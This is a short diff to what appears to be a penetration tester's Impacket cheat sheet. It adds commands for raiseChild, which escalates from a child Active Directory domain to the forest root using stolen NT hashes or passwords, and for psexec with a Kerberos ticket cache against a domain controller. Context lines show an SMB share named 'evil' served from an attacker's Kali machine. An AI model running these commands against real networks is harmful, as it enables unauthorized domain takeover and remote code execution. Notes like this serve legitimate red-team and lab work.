@@ -8,3 +8,10 @@ impacket-smbserver -smb2support evil $PWD
 
 # smbserver (password share on kali)
 impacket-smbserver -smb2support -username evil -password evil evil $PWD
+
+# raiseChild
+impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>
+impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>:'<PASS>'
+
+# psexec via env KRB5CCNAME (testing needed remove dc-ip and target-ip)
+impacket-psexec  -k -no-pass <DOMAIN>/<ADMIN>@<ETC_HOST_FQDN> -dc-ip 192.168.178.70 -target-ip 192.168.178.70
